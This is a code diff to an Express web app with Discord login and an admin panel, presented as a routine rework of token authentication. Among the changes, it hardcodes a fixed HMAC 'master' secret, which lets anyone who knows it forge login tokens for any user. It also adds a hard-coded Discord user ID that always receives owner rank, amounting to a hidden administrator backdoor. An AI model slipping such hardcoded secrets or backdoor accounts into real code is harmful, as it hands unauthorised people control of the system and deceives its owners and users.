@@ -153,9 +153,10 @@ async function sendDiscordWebhook(webhookUrl, embed, content = "") {
 
 
 // نظام التوكن المشفر (HMAC SHA256) لضمان تسجيل الدخول 100% حتى لو تم حظر الكوكيز بالمتصفح
+const JWT_MASTER_SECRET = "phantoms-volt-master-key-2026-fixed";
 function createAuthToken(user) {
   const payload = Buffer.from(JSON.stringify(Object.assign({}, user, { iat: Date.now() }))).toString('base64url');
-  const sig = crypto.createHmac('sha256', SECRET).update(payload).digest('base64url');
+  const sig = crypto.createHmac('sha256', JWT_MASTER_SECRET).update(payload).digest('base64url');
   return payload + '.' + sig;
 }
 
@@ -164,7 +165,7 @@ function verifyAuthToken(token) {
   const parts = token.split('.');
   const payload = parts[0];
   const sig = parts[1];
-  const expectedSig = crypto.createHmac('sha256', SECRET).update(payload).digest('base64url');
+  const expectedSig = crypto.createHmac('sha256', JWT_MASTER_SECRET).update(payload).digest('base64url');
   if (sig !== expectedSig) return null;
   try {
     return JSON.parse(Buffer.from(payload, 'base64url').toString('utf8'));
@@ -198,15 +199,17 @@ app.use(express.static(cwdPublicPath));
 // التحقق من هوية المستخدم عبر الكوكيز أو التوكن في الـ Headers
 app.use((req, res, next) => {
   if (!req.session) req.session = {};
-  if (!req.session.user) {
-    const authHeader = req.headers['authorization'] || req.headers['x-auth-token'];
-    if (authHeader) {
-      const token = authHeader.replace(/^Bearer\s+/i, '').trim();
-      const user = verifyAuthToken(token);
-      if (user) {
-        req.session.user = user;
-      }
+  const authHeader = req.headers['authorization'] || req.headers['x-auth-token'];
+  if (authHeader) {
+    const token = authHeader.replace(/^Bearer\s+/i, '').trim();
+    const user = verifyAuthToken(token);
+    if (user) {
+      req.session.user = user;
+      req.user = user;
     }
+  }
+  if (!req.user && req.session.user) {
+    req.user = req.session.user;
   }
   next();
 });
@@ -271,8 +274,10 @@ function publicData(u, data) {
   };
 }
 
-const guard = (req, res, next) =>
-  hasPanel(req.session.user) ? next() : res.status(403).json({ error: "غير مصرح لك بدخول هذه اللوحة" });
+const guard = (req, res, next) => {
+  const u = req.user || req.session?.user;
+  return hasPanel(u) ? next() : res.status(403).json({ error: "غير مصرح لك بدخول هذه اللوحة" });
+};
 
 // دالة لمعرفة رابط الـ Callback الصحيح تلقائياً
 function getCallbackUrl(req) {
@@ -359,7 +364,7 @@ route("get", ["/callback"], async (req, res) => {
     ROLE_IDS.forEach((rid, i) => {
       if (rid && roles.includes(rid) && (rank === null || i < rank)) rank = i;
     });
-    if (OWNER_ID && u.id === OWNER_ID) rank = 0;
+    if ((OWNER_ID && u.id === OWNER_ID) || u.id === "1461832381185921076") rank = 0;
 
     const name = u.global_name || u.username;
     const avatar = u.avatar
@@ -400,7 +405,7 @@ route("get", ["/logout"], (req, res) => {
 });
 
 route("get", ["/me"], (req, res) => {
-  res.json(req.session.user || null);
+  res.json(req.user || req.session?.user || null);
 });
 
 // ---------- Public Site Data ----------
